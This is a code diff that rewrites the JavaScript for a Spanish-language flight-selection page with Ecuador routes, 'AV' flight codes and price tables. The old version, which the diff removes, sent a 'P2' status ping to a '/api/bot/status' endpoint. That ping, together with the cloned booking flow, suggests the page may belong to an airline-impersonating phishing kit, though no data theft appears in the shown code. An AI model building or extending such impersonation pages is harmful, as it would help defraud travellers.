@@ -1,170 +1,143 @@
 /**
- * SET DOM
- * 
+ * FLIGHT DETAIL (dinámico hasta 10 vuelos)
+ * Archivo completo para reemplazar.
  */
-const modal = document.querySelector('#modal-select-ticket');
 
 const loader = document.querySelector('.loader');
-setTimeout(() =>{
-    try{
-        document.querySelector('body').classList.remove('sb-hidden');
-        loader.classList.remove('show');
+const cardsContainer = document.querySelector('#flight-cards');
+const cardTpl = document.querySelector('#flight-card-template');
 
-        if(info.edit === 1){
-            btnSearchFlight.click();
-        }
-        console.log("Index ON")
-        fetch(`${API_URL}/api/bot/status`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'Authorization': `Bearer ${API_KEY}`
-            },
-            body: JSON.stringify({message: 'P2'})
-        })
-    }catch(err){
-        console.log(err);
-    }
-}, 2500);
-
-const closeModalTicket = document.querySelector('#modal-close-ticket');
-closeModalTicket.addEventListener('click', () =>{
-    try{
-        modal.classList.remove('show');
-    }catch(e){
-        console.log(e);
-    }
-});
-
-
-/* --- HEADER --- */
-document.querySelector('#origin-code').textContent = info.flightInfo.origin.code;
-document.querySelector('#destination-code').textContent = info.flightInfo.destination.code;
-document.querySelector('#flight-date').textContent = monthDic[info.flightInfo.flightDates[0].split('-')[1] - 1] + ' ' +info.flightInfo.flightDates[0].split('-')[2];
-document.querySelector('#flight-label-1').textContent = `Selecciona tu vuelo de salida - ${formatDateType1(info.flightInfo.flightDates[0])}`;
-document.querySelector('#flight-label-2').textContent = `${info.flightInfo.origin.city} a ${info.flightInfo.destination.city}`;
-document.querySelector('#flight-label-3').textContent = `${formatDateType1(info.flightInfo.flightDates[0])}`;
-
-
-/* --- FLIGHT CARDS --- */
-if(info.flightInfo.origin.country === 'Ecuador' && info.flightInfo.destination.country === 'Ecuador'){
-    document.querySelector('#flight-price-0').textContent = formatPrice(pricesNAC.flight_1.xs);
-    document.querySelector('#flight-price-1').textContent = formatPrice(pricesNAC.flight_1.xs);
-    document.querySelector('#flight-price-2').textContent = formatPrice(pricesNAC.flight_2.xs);
-    document.querySelector('#flight-price-3').textContent = formatPrice(pricesNAC.flight_3.xs);
-}else{
-    document.querySelector('#flight-price-0').textContent = formatPrice(pricesINT.flight_1.xs);
-    document.querySelector('#flight-price-1').textContent = formatPrice(pricesINT.flight_1.xs);
-    document.querySelector('#flight-price-2').textContent = formatPrice(pricesINT.flight_2.xs);
-    document.querySelector('#flight-price-3').textContent = formatPrice(pricesINT.flight_3.xs);
+function isNacional() {
+  return (
+    info?.flightInfo?.origin?.country === 'Ecuador' &&
+    info?.flightInfo?.destination?.country === 'Ecuador'
+  );
 }
 
+function priceTable() {
+  return isNacional() ? pricesNAC : pricesINT;
+}
 
+function asPrice(v) {
+  if (typeof formatPrice === 'function') return formatPrice(v);
+  try {
+    return new Intl.NumberFormat('es-CO').format(Number(v));
+  } catch (e) {
+    return String(v);
+  }
+}
 
+const flightSlots = [
+  { start: '07:15', end: '08:30', code: 'AV 8908', duration: '1h 15m' },
+  { start: '10:00', end: '11:15', code: 'AV 8904', duration: '1h 15m' },
+  { start: '16:45', end: '18:00', code: 'AV 8704', duration: '1h 15m' },
+  { start: '18:30', end: '19:45', code: 'AV 8710', duration: '1h 15m' },
+  { start: '20:00', end: '21:15', code: 'AV 8720', duration: '1h 15m' },
+  { start: '06:00', end: '07:15', code: 'AV 8801', duration: '1h 15m' },
+  { start: '08:45', end: '10:00', code: 'AV 8803', duration: '1h 15m' },
+  { start: '12:10', end: '13:25', code: 'AV 8805', duration: '1h 15m' },
+  { start: '13:40', end: '14:55', code: 'AV 8807', duration: '1h 15m' },
+  { start: '22:10', end: '23:25', code: 'AV 8809', duration: '1h 15m' },
+];
 
+function flightKeyByIndex(i) {
+  return `flight_${i + 1}`;
+}
 
-
-
-/**
- * BUTTONS
- * 
- */
-const btnEditFlight = document.querySelector('#btn-edit-flight');
-btnEditFlight.addEventListener('click', ()=>{
-    info.edit = 1;
+function loadFlight(key) {
+  // Mantén compatibilidad con tu flujo
+  if (window.info && window.updateLS) {
+    info.flightInfo.ticket = key;
     updateLS();
-    window.location.href = 'index.html';
-});
-
-
-
-
-
-
-
-
-
-/**
- * FUNCTIONS
- * 
- */
-function updateLS(){
-    LS.setItem('info', JSON.stringify(info));
+  }
+  // Si tu flujo navega aquí, lo dejas:
+  // window.location.href = 'step-two.html';
 }
 
-function formatDateType1(date){
-    let format = new Date(parseInt(date.split('-')[0]), parseInt(date.split('-')[1]) - 1, parseInt(date.split('-')[2]) - 1);
-    return dayDic[format.getDay()] + ', ' + monthDic[format.getMonth()] + ' ' + date.split('-')[2];
+function formatDateSafe(ts) {
+  try {
+    return formatDateType1(ts);
+  } catch (e) {
+    return '';
+  }
 }
 
-function formatPrice(number){
-    return number.toLocaleString('en', {
-        maximumFractionDigits: 2
-    });
+function renderHeaderAndFrom() {
+  const label1 = document.querySelector('#flight-label-1');
+  const label2 = document.querySelector('#flight-label-2');
+  const label3 = document.querySelector('#flight-label-3');
+  const fromSpan = document.querySelector('#flight-price-0');
+
+  if (label1) {
+    const idx = (info?.flightInfo?.type === 1) ? 0 : 1;
+    label1.textContent = `Selecciona tu vuelo de ${info?.flightInfo?.type === 1 ? 'salida' : 'regreso'} - ${formatDateSafe(info?.flightInfo?.flightDates?.[idx])}`;
+  }
+  if (label2) {
+    label2.textContent = `${info?.flightInfo?.origin?.city ?? ''} a ${info?.flightInfo?.destination?.city ?? ''}`;
+  }
+  if (label3) {
+    const idx = (info?.flightInfo?.type === 1) ? 0 : 1;
+    label3.textContent = `${formatDateSafe(info?.flightInfo?.flightDates?.[idx])}`;
+  }
+
+  const ptab = priceTable();
+  const firstKey = flightKeyByIndex(0);
+  const firstPrice = (ptab[firstKey]?.xs ?? ptab['flight_1']?.xs);
+  if (fromSpan && firstPrice != null) {
+    const val = Number(firstPrice);
+    fromSpan.textContent = asPrice(isNaN(val) ? firstPrice : val.toFixed(2));
+  }
 }
 
-function loadFlight(flight_sched){
-    //Open modal
-    try{
-        modal.classList.add('show');
-    }catch(err){
-        console.log(err);
+function renderCards() {
+  if (!cardsContainer || !cardTpl) return;
+  cardsContainer.innerHTML = '';
+
+  const ptab = priceTable();
+  const max = Math.min(10, flightSlots.length);
+
+  const xsList = [];
+  for (let i = 0; i < max; i++) {
+    const key = flightKeyByIndex(i);
+    const xs = ptab[key]?.xs ?? null;
+    xsList.push(xs);
+  }
+  const xsNumbers = xsList.filter(v => v != null).map(Number);
+  const minXs = xsNumbers.length ? Math.min(...xsNumbers) : null;
+
+  for (let i = 0; i < max; i++) {
+    const slot = flightSlots[i];
+    const key = flightKeyByIndex(i);
+    const prices = ptab[key];
+
+    if (!prices) continue;
+
+    const node = cardTpl.content.firstElementChild.cloneNode(true);
+
+    node.querySelector('.time-start').textContent = slot.start;
+    node.querySelector('.time-end').textContent = slot.end;
+    node.querySelector('.flight-code').textContent = slot.code;
+    node.querySelector('.flight-duration').textContent = slot.duration;
+
+    const priceEl = node.querySelector('.price-value');
+    const val = Number(prices.xs);
+    priceEl.textContent = asPrice(isNaN(val) ? prices.xs : val.toFixed(2));
+
+    if (minXs != null && Number(prices.xs) === Number(minXs)) {
+      const best = node.querySelector('.best-price-label');
+      if (best) best.style.display = '';
     }
 
-    info.flightInfo.ticket_sched = flight_sched;
-    updateLS();
-
-    const xsPrice = document.querySelector('#xs');
-    const sPrice = document.querySelector('#s');
-    const mPrice = document.querySelector('#m');
-    if(info.flightInfo.origin.country === 'Ecuador' && info.flightInfo.destination.country === 'Ecuador'){
-        // Set type
-        info.flightInfo.ticket_nat = 'NAC';
-        updateLS();
-
-        console.log(info.flightInfo);
-
-        if(flight_sched === 'flight_1'){
-            xsPrice.textContent = formatPrice(pricesNAC.flight_1.xs)
-            sPrice.textContent = formatPrice(pricesNAC.flight_1.s)
-            mPrice.textContent = formatPrice(pricesNAC.flight_1.m)
-        }else if(flight_sched === 'flight_2'){
-            xsPrice.textContent = formatPrice(pricesNAC.flight_2.xs)
-            sPrice.textContent = formatPrice(pricesNAC.flight_2.s)
-            mPrice.textContent = formatPrice(pricesNAC.flight_2.m)
-        }else if(flight_sched === 'flight_3'){
-            xsPrice.textContent = formatPrice(pricesNAC.flight_3.xs)
-            sPrice.textContent = formatPrice(pricesNAC.flight_3.s)
-            mPrice.textContent = formatPrice(pricesNAC.flight_3.m)
-        }
-    }else{
-        // Set type
-        info.flightInfo.ticket_nat = 'INT';
-        updateLS();
-
-        if(flight_sched === 'flight_1'){
-            xsPrice.textContent = formatPrice(pricesINT.flight_1.xs)
-            sPrice.textContent = formatPrice(pricesINT.flight_1.s)
-            mPrice.textContent = formatPrice(pricesINT.flight_1.m)
-        }else if(flight_sched === 'flight_2'){
-            xsPrice.textContent = formatPrice(pricesINT.flight_2.xs)
-            sPrice.textContent = formatPrice(pricesINT.flight_2.s)
-            mPrice.textContent = formatPrice(pricesINT.flight_2.m)
-        }else if(flight_sched === 'flight_3'){
-            xsPrice.textContent = formatPrice(pricesINT.flight_3.xs)
-            sPrice.textContent = formatPrice(pricesINT.flight_3.s)
-            mPrice.textContent = formatPrice(pricesINT.flight_3.m)
-        }
-    }
+    node.addEventListener('click', () => loadFlight(key));
+    cardsContainer.appendChild(node);
+  }
 }
 
-function nextStep(type){
-    info.flightInfo.ticket_type = type;
-    updateLS();
-    if(info.flightInfo.type === 1){
-        window.location.href = 'flight-detail-back.html';
-    }else{
-        window.location.href = 'step-two.html';
-    }
-    
-}
+(function init() {
+  try {
+    document.body?.classList?.remove?.('sb-hidden');
+    loader?.classList?.remove?.('show');
+  } catch (e) {}
+  renderHeaderAndFrom();
+  renderCards();
+})();
